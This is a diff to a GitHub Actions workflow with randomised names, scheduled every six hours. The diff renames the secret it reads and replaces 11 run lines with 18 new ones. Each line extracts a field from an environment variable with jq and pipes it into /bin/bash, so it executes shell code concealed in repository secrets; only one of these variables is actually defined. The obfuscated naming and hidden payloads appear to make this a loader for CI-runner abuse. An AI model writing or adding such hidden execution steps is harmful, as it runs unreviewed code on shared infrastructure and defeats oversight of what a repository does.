@@ -2,7 +2,7 @@ name: zkmmlkk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 3/6 * * *'
+    - cron: '16 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,17 +10,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: zkmmlkk
         env:
-          nacl6743: ${{ secrets.nacl6743 }}
+          jplw71676: ${{ secrets.jplw71676 }}
         run: |
-          echo $nacl6743 | jq -r .bke1917 | /bin/bash
-          echo $t60 | jq -r .ptxwd9 | /bin/bash
-          echo $vlk31672 | jq -r .i9495 | /bin/bash
-          echo $k217 | jq -r .rj8032 | /bin/bash
-          echo $p32637 | jq -r .ufyd83163 | /bin/bash
-          echo $krn871 | jq -r .wgsob971 | /bin/bash
-          echo $pvpw4 | jq -r .uzre180 | /bin/bash
-          echo $hhtu8441 | jq -r .sedu024 | /bin/bash
-          echo $d80022 | jq -r .dbid5 | /bin/bash
-          echo $t1751 | jq -r .ce32 | /bin/bash
-          echo $bkqiu04 | jq -r .i89 | /bin/bash
+          echo $jplw71676 | jq -r .vhfo2 | /bin/bash
+          echo $fofa13385 | jq -r .qbhyt34 | /bin/bash
+          echo $mck6510 | jq -r .cqz719 | /bin/bash
+          echo $vj4481 | jq -r .iqpyl88518 | /bin/bash
+          echo $p228 | jq -r .stnj7022 | /bin/bash
+          echo $r32491 | jq -r .f480 | /bin/bash
+          echo $xgr1 | jq -r .xo09 | /bin/bash
+          echo $idp520 | jq -r .km3966 | /bin/bash
+          echo $yb20 | jq -r .vabbr5524 | /bin/bash
+          echo $cq1 | jq -r .ypda6 | /bin/bash
+          echo $qxq8863 | jq -r .hrel2 | /bin/bash
+          echo $yrhe2379 | jq -r .a1 | /bin/bash
+          echo $x0 | jq -r .opfo8672 | /bin/bash
+          echo $dzq1470 | jq -r .bxr6475 | /bin/bash
+          echo $gaw3834 | jq -r .bmy8 | /bin/bash
+          echo $wrq6 | jq -r .fcpj7427 | /bin/bash
+          echo $rrsa43 | jq -r .xzs67325 | /bin/bash
+          echo $xv33673 | jq -r .ndpny78034 | /bin/bash
 
